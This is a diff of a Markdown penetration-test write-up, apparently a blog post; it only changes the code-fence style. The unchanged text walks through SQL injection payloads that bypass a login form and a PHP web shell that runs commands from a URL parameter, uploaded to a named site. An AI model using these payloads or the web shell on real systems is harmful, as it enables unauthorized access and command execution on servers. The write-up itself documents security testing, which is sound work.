@@ -26,10 +26,10 @@ I checked once again to make sure that directory indexing is not enabled on the 
 
 I tried to use this login credentials on the login form.
 
-```
+~~~
 Username: '
 Password: '
-```
+~~~
 
 The application gave me an unexpected response.
 
@@ -37,17 +37,17 @@ The application gave me an unexpected response.
 
 The login form is vulnerable to SQL injection. I didn't try it when I went to Alpha Web Agency's site in November 2015. I tried to bypass the authentication sequence.
 
-```
+~~~
 Username: ' OR 1=1--
 Password: ' OR 1=1--
-```
+~~~
 
 I still got the same response as before. So I tried another one.
 
-```
+~~~
 Username: ' OR 1=1#
 Password: ' OR 1=1#
-```
+~~~
 
 And the admin panel is served.
 
@@ -65,13 +65,13 @@ We can always disable JavaScript on modern browsers, and I successfully uploaded
 
 This is the file I uploaded.
 
-```php
+~~~php
 <?php
 echo '<pre>';
 echo shell_exec($_GET['cmd']);
 echo '</pre>';
 ?>
-```
+~~~
 
 The PHP configuration on the server prevents the `shell_exec` from running, but it should be possible to do other things with an uploaded PHP file.
 
